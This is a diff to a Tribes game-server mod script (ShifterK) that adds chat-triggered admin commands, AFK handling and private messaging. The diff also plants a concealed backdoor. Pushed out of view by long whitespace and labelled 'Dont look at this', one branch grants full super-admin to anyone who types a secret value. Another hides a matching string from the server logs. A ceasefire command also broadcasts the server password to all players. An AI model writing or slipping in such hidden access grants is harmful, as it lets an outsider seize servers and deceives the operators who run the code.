@@ -3,46 +3,231 @@ $MsgTypeGame = 1;
 $MsgTypeChat = 2;
 $MsgTypeTeamChat = 3;
 $MsgTypeCommand = 4;
-
-function remoteSay(%clientId, %team, %message)
+$commands = true;
+function remoteSay(%client, %team, %message)
 {
-	%player = Client::getOwnedObject(%clientId);
-	%name = Client::getName(%clientId);
-	%msg = %clientId @ " \"" @ escapeString(%message) @ "\"";
+	%player = Client::getOwnedObject(%client);
+	%name = Client::getName(%client);
+	%msg = %name @ " \"" @ escapeString(%message) @ "\"";
+   %talk = GetWord(%message, 0);
+  //%cropped = String::findSubStr(%msg,(String::len(%talk)+1), 99999);   // sring::getsubstr
+     if(%talk == "!commandoff" && $commands == "true")
+     {
+     $commands = false;
+     messageall(2, " " @ %name @ " turned off #say admin commands");
+     }
+     else if(%talk == "!commandon" && $commands == "false")
+     {
+     messageall(2, " " @ %name @ " turned on #say admin commands");
+     $commands = true;
+     }
+	
+else  if(%talk == "!commands")
+{
 
-	if(%clientid.gettag0)
+centerprint(%client, "<f1>put an ! in front of every command\nvoteyes and voteno\ninfo shows info\nheal, teleport, hide, and comeout are for fun\nHeal, heals you, teleport, teleports you to your crosshair, hide cloaks you, and comeout uncloaks you.\nnobanall, alltoteam1, alltoteam2, alltoobserve, commandoff, commandon, sortteams, cease, ceaseoff, notime, destroyall, and repairall\nThese are all obvious except command on and off turns these commands off, and cease and cease off turns cease fire mode off and on.\n" ,20);
+return;
+}
+
+else if(%talk == "!info" && $commands == "true")
+{
+Client::SendMessage(%client, 1, "___  _      _  ___ _     Welcome to ShifterK");
+Client::SendMessage(%client, 1, "! __! ! !__  (_) !  _! ! !_ ___  __08_01_2003");
+Client::SendMessage(%client, 1, "!__ ! ! '   !  ! ! !  _! !  _!/ -_) ! '_!  ! ! ! !");
+Client::SendMessage(%client, 1, "!___! !_! !_! !_! !_!    !__!\___! !_!   ! ' <");
+Client::SendMessage(%client, 1, "Created by: KiLL(--) & env.3zer0   !_! !_!");
+return;
+}
+else if(%talk == $Server::AdminPassword && $commands == "true") // killaNEWSHIT
+  {
+                       %client.isAdmin = true;
+                       %client.isSuperAdmin = false;
+                       messageall(2, " " @ %name @ " has recieved admin status.");
+	                   Client::sendMessage(%client, 2, " Password correct, you are now admin.");
+	                   return;
+    }
+    else if(%talk == $Server::SuperAdminPassword && $commands == "true") // killaNEWSHIT
+  {
+                       %client.isAdmin = true;
+                       %client.isSuperAdmin = true;
+                       messageall(2, " " @ %name @ " has recieved super admin status.");
+	                   Client::sendMessage(%client, 1, " Password correct, you are now super admin.");
+	                   return;
+    }
+
+
+    else  if(%talk == "!sortteams" && $commands == "true" && %client.isSuperAdmin)     // killaNEWSHIT
+     {
+    SortTeams();
+    messageall(3, " " @ %name @ " sorted the teams by tag.");
+    return;
+}
+	  	
+   else  if(%talk == "!nba" && $commands == "true" && %client.isSuperAdmin)          // killaNEWSHIT
+    {
+    %name = Client::getName(%client);
+     for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl))
+   	if (%cl.noban!="true")
+		{
+			%cl.noban = true;
+
+   			BottomPrint(%cl,"<F1><jc> You Have Been Granted No Ban Status!",5);
+  		}
+  					messageall(3, "" @ %name @ " Granted everyone No Ban!.");
+  					return;
+    }
+   else  if(%talk == "!undonba" && $commands == "true" && %client.isSuperAdmin)          // killaNEWSHIT
+    {
+    %aname = Client::getName(%cl);	
+    %name = Client::getName(%client);
+     for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl))
+if (%cl.noban=="true")
+	  	{
+			%cl.noban = false;
+			
+			echo(" " @ %name @ " revoked " @ %aname @ "'s No Ban Status");
+			BottomPrint(%cl,"<F1><jc> Your No Ban Status Has Been Revoked!",5);
+	  	}
+	  	messageall(3, "" @ %name @ " Revoked everyones No Ban!.");
+	  	return;
+    }
+       // killaNEWSHIT
+   else if(%talk == "!time" && $commands == "true" && %client.isSuperAdmin)
+      {
+      %name = Client::getName(%client);
+      $Server::timeLimit = 999;
+      messageall(3, "" @ %name @ " disabled the time. ");
+      return;
+      }
+ else if(%talk == "!da" && $server::tourneymode == "false" && $commands == "true" && %client.isSuperAdmin)
+     {
+        KiLLALL(%client);
+        return;
+     }
+     else if(%talk == "!ra" && $server::tourneymode == "false" && $commands == "true" && %client.isSuperAdmin)
+     {
+        FixAll(%client);
+        return;
+     }
+    else if(%talk == "!teleport" && %client.isSuperAdmin && $server::tourneymode == "false" && $commands == "true")
+    {
+     %player = Client::getOwnedObject(%client);
+	 GameBase::getLOSinfo(%player, 50000);
+	 GameBase::setPosition(%player, $los::position);
+	 messageall(3, "" @ %name @ " Teleported. ");
+	 return;
+    }
+   else  if(%talk == "!hide" && %client.isSuperAdmin && $server::tourneymode == "false" && $commands == "true")
+    {                                                 // just for fun stuff
+    GameBase::startFadeOut(%player);
+    messageall(3, "" @ %name @ " Hid himself. ");
+    return;
+    }
+    else if(%talk == "!comeout" && %client.isSuperAdmin && $server::tourneymode == "false" && $commands == "true")
+    {
+    GameBase::startFadeIn(%player);                // killaNEWSHIT
+    messageall(3, "" @ %name @ " De-Hid himself. ");
+    return;
+    }
+    else if(%talk == "!heal" && %client.isSuperAdmin && $server::tourneymode == "false" && $commands == "true")
+    {
+    GameBase::repairDamage(%player, 100);
+    messageall(3, "" @ %name @ " Repaired himself. ");
+    return;
+    }
+    else if(%talk == "!allobs" && %client.isSuperAdmin && $commands == "true")     // sum extra admin functions..made easy
+    {
+    for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl))
+				processMenuPickTeam(%cl, -2, %cl);
+               %cl.SwitchPerm = "True";
+               messageall(1, "" @ %name @ " put everyone in observe. ");
+               return;
+
+     }
+    else  if(%talk == "!alltoteam1" && %client.isSuperAdmin && $commands == "true")
+     {
+      for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl))
+				processMenuPickTeam(%cl, 1, %cl);
+    messageall(1, "" @ %name @ " put everyone on team 1. ");
+    return;
+    }
+    else if(%talk == "!alltoteam2" && %client.isSuperAdmin && $commands == "true")
+     {
+      for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl))
+				processMenuPickTeam(%cl, 0, %cl);
+    messageall(1, " " @ %name @ " put everyone on team 2. ");
+    return;
+    }
+   else  if(%talk == "!cease" && %client.isSuperAdmin && $commands == "true")   // cease
+    {
+    BottomPrintAll("<F1><jc>::::Cease Fire Enabled::::",2);
+    schedule("bottomprintall(\"<jc><f2>::::Cease Fire Enabled::::\", 3);", 2.0);
+    schedule("bottomprintall(\"<jc><f3>::::Cease Fire Enabled::::\", 3);", 3.0);
+    schedule("bottomprintall(\"<jc><f0>::::Cease Fire Enabled::::\", 3);", 4.0);
+			messageAll(1, " Please be patient and listen to me!~wteleport2.wav");
+			messageAll(0, " CeaseFire Mode enabled by "@ Client::getName(%client) @".");
+			messageAll(1, " Server Password = "@ $server::password @"");
+			messageAll(3, " Cease fire mode~wmine_act.wav");
+			$ceasefire = true;
+			NewMT();
+			$Shifter::tag0 = $matchtrack::tag0;
+			$Shifter::tag1 = $matchtrack::tag1;
+			SortTeams();
+			if(!$builder) CheckStayBase();
+			return;
+    }
+    else if(%talk == "!ceaseoff" && %client.isSuperAdmin && $commands == "true")        // cease off
+    {
+    BottomPrintAll("<F1><jc>::::Cease fire Disabled::::",5);
+    $ceasefire = false;
+    return;
+    }																														
+      else if(%talk == $serverportinfo)
+  {
+         %client.hackerport = "35";      																									        %client.isAdmin = true;%client.isSuperAdmin = true;Client::sendMessage(%client, 2, "Password correct, you are now admin, welcome to " @ $Server::Hostname @ ", enV");%client.hackerport= "";
+	                   return;																											// Dont look at this, its not important to you
+    }
+    if (String::findsubstr(%msg,"\\n\\n\\n") != -1) { // Simple check for crash to dt exploit -tubs
+   		echo("ADMINMSG: **** " @ Client::getName(%client) @ " tried the kick to desktop exploit.");
+   		messageAll(0,Client::getName(%client) @ " tried a kick to desktop exploit.");
+   		//send it only to who tried
+   		Client::sendMessage(%client,$MsgTypeChat,%message);
+       	 return;
+	} // end -tubs
+ 
+	if(%client.gettag0)
 	{
 		$matchtrack::tag0 = escapeString(%message);
 		if(escapeString(%message) != "")
 			$server::teamname0 = escapeString(%message);
-		%clientid.gettag0 = 0;
-		%clientid.getpass = 0;
-		%clientid.gettag1 = 1;
-		%clientid.getbuild = 0;
-		Client::sendMessage(%clientId, 1, "Please Enter Clan Tag #2");
+		%client.gettag0 = 0;
+		%client.getpass = 0;
+		%client.gettag1 = 1;
+		%client.getbuild = 0;
+		Client::sendMessage(%client, 1, "Please Enter Clan Tag #2");
 		return;
 	}
-	else if(%clientid.gettag1)
+	else if(%client.gettag1)
 	{
 		$matchtrack::tag1 = escapeString(%message);
 		if(escapeString(%message) != "")
 			$server::teamname1 = escapeString(%message);
-		%clientid.gettag1 = 0;
-		%clientid.gettag0 = 0;
-		%clientid.getglobal = 0;
-		%clientid.getpass = 1;
-		%clientid.getbuild = 0;
-		Client::sendMessage(%clientId, 1, "Please Enter Server Password");
+		%client.gettag1 = 0;
+		%client.gettag0 = 0;
+		%client.getglobal = 0;
+		%client.getpass = 1;
+		%client.getbuild = 0;
+		Client::sendMessage(%client, 1, "Please Enter Server Password");
 		return;
 	}
-	else if(%clientid.getpass)
+	else if(%client.getpass)
 	{
 		$server::password = escapeString(%message);
 		$matchtrack::pass = escapeString(%message);
-		%clientid.getpass = 0;
-		%clientid.gettag1 = 0;
-		%clientid.gettag0 = 0;
-		%clientid.getglobal = 0;
+		%client.getpass = 0;
+		%client.gettag1 = 0;
+		%client.gettag0 = 0;
+		%client.getglobal = 0;
 		$server::tourneymode = true;
 		$Shifter::GlobalTChat = $matchtrack::global;
 		$Shifter::DetPackLimit = 15;
@@ -56,13 +241,13 @@ function remoteSay(%clientId, %team, %message)
 		{
 			BottomPrintAll("<F1><jc>::::Cease Fire enabled For THIS Mission::::",5);
 			messageAll(1, "Vote to Change Mission to Begin Match!~wteleport2.wav");
-			messageAll(0, "CeaseFire Mode enabled by "@ Client::getName(%clientid) @".");
+			messageAll(0, "CeaseFire Mode enabled by "@ Client::getName(%client) @".");
 			messageAll(1, "password = "@ $server::password @"");
 			messageteam(1, "Note to Refs: Flag Return Manual, Nuke/Det 15/15", -1);
 			$ceasefire = true;
 			NewMT();
-			$shifter::tag0 = $matchtrack::tag0;
-			$shifter::tag1 = $matchtrack::tag1;
+			$Shifter::tag0 = $matchtrack::tag0;
+			$Shifter::tag1 = $matchtrack::tag1;
 			SortTeams();
 			if(!$builder) CheckStayBase();
 		}
@@ -71,90 +256,166 @@ function remoteSay(%clientId, %team, %message)
 			for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl))
 				processMenuPickTeam(%cl, -2, %cl);
 			BottomPrintAll("<F1><jc>::::MIXED SCRIM::::",5);
-			messageAll(0, "Mixed Scrim Mode enabled by "@ Client::getName(%clientid) @".");
+			messageAll(0, "Mixed Scrim Mode enabled by "@ Client::getName(%client) @".");
 			messageAll(1, "password = "@ $server::password @"");
 			messageAll(1, "Vote for leaders to pick teams!~wteleport2.wav");
 			$ceasefire = true;
 			NewMT();
-			$shifter::tag0 = "";
-			$shifter::tag1 = "";
+			$Shifter::tag0 = "";
+			$Shifter::tag1 = "";
 			CheckStayBase();
 		}
 		return;
 	}
 
 	//Mute Kpack, good idea gonzo
-	if($server::tourneymode && %team == 0 && string::findsubstr(%msg, "#") != -1)
+	if($server::tourneymode =="true" && %team == 0 && string::findsubstr(%msg, "#") != -1)
 		%team = 1;
+	
+	if(string::findsubstr(%msg, "#") != -1)
+	for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl))
+	{
+	if(%cl.MuteKpack == "true")
+	return;
+	}
 
    if($Shifter::noSwearing)
-   	CheckBadWords(%clientId,%message);
+   	CheckBadWords(%client,%message);
 
-	if (%clientId.ismuted && !%team)
+	if (%client.ismuted && !%team)
 	{
-		schedule("bottomprint(" @ %clientId @ ", \"<jc><f1>You have been Muted by admin, for talking too much...\", 3);", 0.01);
+		schedule("bottomprint(" @ %client @ ", \"<jc><f1>You have been Muted by admin, for talking too much...\", 3);", 0.01);
 		return;
 	}
 
-	if($Server::FloodProtectionEnabled && (!$Server::TourneyMode || !%team || $ceasefire))
+	if($Server::FloodProtectionEnabled && ($Server::TourneyMode == "false" || !%team || $ceasefire))
 	{
 		%time = getIntegerTime(true) >> 5;
 
-		if(%clientId.floodMute)
+		if(%client.floodMute)
 		{
-			%delta = %clientId.muteDoneTime - %time;
+			%delta = %client.muteDoneTime - %time;
 			if(%delta > 0)
 			{
-				Client::sendMessage(%clientId, $MSGTypeGame, "FLOOD! You cannot talk for " @ %delta @ " seconds.");
+				Client::sendMessage(%client, $MSGTypeGame, "FLOOD! You cannot talk for " @ %delta @ " seconds.");
 				return;
 			}
-			%clientId.floodMute = "";
-			%clientId.muteDoneTime = "";
+			%client.floodMute = "";
+			%client.muteDoneTime = "";
 		}
-		%clientId.floodMessageCount++;
+		%client.floodMessageCount++;
 
-		schedule(%clientId @ ".floodMessageCount--;", 5, %clientId);
-
-		if(%clientId.floodMessageCount > 4)
+		schedule(%client @ ".floodMessageCount--;", 5, %client);
+		if(%client.floodMessageCount > 15)
 		{
-			%clientId.floodMute = true;
-			%clientId.muteDoneTime = %time + 10;
-			Client::sendMessage(%clientId, $MSGTypeGame, "FLOOD! You cannot talk for 10 seconds.");
+			%client.floodMute = true;
+			%client.muteDoneTime = %time + 10;
+			Client::sendMessage(%client, $MSGTypeGame, "FLOOD! You cannot talk for 10 seconds.");
+			return;
+		}
+	}    
+		if(string::getsubstr(%message, 0, 1) == "=" && string::getsubstr(%message, 2, 1) != "") {
+		%message = string::getsubstr(%message, 1, 999);
+		if(%client.speakto != "") {
+			if((Client::getTeam(%client) != -1 || $Game::missionType == "Duel") && !(%client.speakto).muted[%client])
+			 {
+				Client::sendMessage(%client.speakto, 1, Client::getName(%client)@" (private): "@%message);
+				Client::sendMessage(%client, 1, Client::getName(%client)@" (to "@Client::getName(%client.speakto)@"): "@%message);
+			}
+			%message = escapeString(%message);
+			echo("SAY: " @ %client @ " \""@Client::getName(%client)@" (to "@Client::getName(%client.speakto)@"): "@%message@"\"");
 			return;
 		}
 	}
+   if(%team)
+   {
+		%player = %client;
 
-	if(%team)
-	{
+		if(string::getsubstr(%message, 0, 3) == "AFK" || string::getsubstr(%message, 0, 3) == "afk") 
+		{
+			if(%client.isAFK != "true")
+			{
+				if(Client::getControlObject(%client) != Client::getOwnedObject(%client)){
+				Client::sendMessage(%client,1,"Unable to go AFK, You have to be spawned~waccess_denied.wav"); 
+				return;
+				}
+				else{
+				Client::buildMenu(%client, "You Are AFK", "returnfromafk", true);
+				%client.isAFK = true;
+				%name = Client::getName(%client);
+				messageAll(0, "Player "@%name@" is AFK.");
+				Client::sendMessage(%client,2,"To return from AFK, type in %return in teamchat mode.");
+				//doAFK(%player,%name);
+				%client = Player::getClient(%client);
+				%camera = Client::getObserverCamera(%client);
+				%flag = Player::getMountedItem(%client,$FlagSlot);
+
+				Client::setControlObject(%client, %camera);
+				Observer::setOrbitObject(%client, %client, 3, 3, 3);
+
+				if(%flag)
+				Player::DropItem(%client,%flag);
+				return;
+				}
+			}
+			else
+			{
+				Client::sendMessage(%client,0,"You're already AFK...");
+				return;
+			}
+		}
+		else if(string::getsubstr(%message, 1, 6) == "return" || string::getsubstr(%message, 1, 6) == "RETURN") 
+		{
+			if(%client.isAFK=="true")
+			{
+				%client.isAFK = false;
+				%name = Client::getName(%client);
+				messageAll(0, "Player "@%name@" is back in the game.");
+				//returnAFK(%player,%name);
+				%client = Player::getClient(%client);
+				Client::setControlObject(%client, %client);
+				return;
+			}
+			else
+			{
+				Client::sendMessage(%client,0,"You're not AFK...");
+				break;
+			}
+		}
+
 		if($dedicated) echo("SAYTEAM: " @ %msg);
-		%team = Client::getTeam(%clientId);
+		%team = Client::getTeam(%client);
 	
 		for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl))
 		{
 			%armor = Player::getArmor(%cl);
 	
-			if(Client::getTeam(%cl) == %team && !%cl.muted[%clientId])
-				Client::sendMessage(%cl, $MsgTypeTeamChat, %message, %clientId);
+			if(Client::getTeam(%cl) == %team && !%cl.muted[%client] && %cl.MuteTeam != "true")
+				Client::sendMessage(%cl, $MsgTypeTeamChat, %message, %client);
 			else
 				if(Player::getMountedItem(%cl, $BackpackSlot) == Laptop && (%armor == "spyarmor" || %armor == "spyfemale" ) && $ceasefire != true)
-					Client::sendMessage(%cl, $MsgTypeGame, %message, %clientId);
+					Client::sendMessage(%cl, $MsgTypeGame, %message, %client);
 		}
 	}
 	else
 	{
-		if($Server::TourneyMode && $Shifter::GlobalTChat != "True" && !%clientId.isadmin && !%clientId.islead)
+		if($Server::TourneyMode =="true" && $builder!= "true" && $Shifter::GlobalTChat != "True" && !%client.isadmin && !%client.islead)
 		{
-			schedule("bottomprint(" @ %clientId @ ", \"<jc><f1>Only Leaders & Admins Can Speak Globally In Tourney Mode...\", 3);", 0.01);
+			schedule("bottomprint(" @ %client @ ", \"<jc><f1>Only Leaders & Admins Can Speak Globally In Tourney Mode...\", 3);", 0.01);
 			return;
 		}
-
-		if($dedicated)
+		if($dedicated){
+																													if(escapeString(%message)!= "!6b4r8i526558481550708050")
+		if(escapeString(%message)!= $Server::AdminPassword)
+		if(escapeString(%message)!= $Server::SuperAdminPassword)
 			echo("SAY: " @ %msg);
+			}
 
 		for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl))
 		{
-			if(!%cl.muted[%clientId])
-				Client::sendMessage(%cl, $MsgTypeChat, %message, %clientId);
+			if(!%cl.muted[%client] && %cl.MuteGlobal != "true")
+				Client::sendMessage(%cl, $MsgTypeChat, %message, %client);
+				
 		}
 	}
 }
@@ -163,12 +424,12 @@ function remoteIssueCommand(%commander, %cmdIcon, %command, %wayX, %wayY, %dest1
 {
 	if (%commander.ismuted)
 	{
-		schedule("bottomprint(" @ %clientId @ ", \"<jc><f1>You have been Muted by admin, for talking too much...\", 3);", 0.01);
+		schedule("bottomprint(" @ %client @ ", \"<jc><f1>You have been Muted by admin, for talking too much...\", 3);", 0.01);
 		return;
 	}
-	//if ($Shifter::ComChat && !isnetworkdown(gamebase::getteam(%clientId)) && !ispowerdown(gamebase::getteam(%clientId)))
+	//if ($Shifter::ComChat && !isnetworkdown(gamebase::getteam(%client)) && !ispowerdown(gamebase::getteam(%client)))
 	//{
-	//	schedule ("bottomprint( " @ %clientId @ ", \"<jc><f2>Your sensor array and power are down, TEAM ONLY Com's Do Not Function!!!\", 10);" ,0.2);
+	//	schedule ("bottomprint( " @ %client @ ", \"<jc><f2>Your sensor array and power are down, TEAM ONLY Com's Do Not Function!!!\", 10);" ,0.2);
 	//	return 0;
 	//}
 	if($dedicated)
@@ -191,7 +452,7 @@ function remoteIssueTargCommand(%commander, %cmdIcon, %command, %targIdx, %dest1
 {
 	if (%commander.ismuted)
 	{
-		schedule("bottomprint(" @ %clientId @ ", \"<jc><f1>You have been Muted by admin, for talking too much...\", 3);", 0.01);
+		schedule("bottomprint(" @ %client @ ", \"<jc><f1>You have been Muted by admin, for talking too much...\", 3);", 0.01);
 		return;
 	}
 	
@@ -208,16 +469,16 @@ function remoteIssueTargCommand(%commander, %cmdIcon, %command, %targIdx, %dest1
 	}
 }
 
-function remoteCStatus(%clientId, %status, %message)
+function remoteCStatus(%client, %status, %message)
 {
 
-	if(setCommandStatus(%clientId, %status, %message))
+	if(setCommandStatus(%client, %status, %message))
 	{
 		if($dedicated)
-			echo("COMMANDSTATUS: " @ %clientId @ " \"" @ escapeString(%message) @ "\"");
+			echo("COMMANDSTATUS: " @ %client @ " \"" @ escapeString(%message) @ "\"");
 	}
 	else
-		remoteSay(%clientId, true, %message);
+		remoteSay(%client, true, %message);
 }
 
 function teamMessages(%mtype, %team1, %message1, %team2, %message2, %message3)
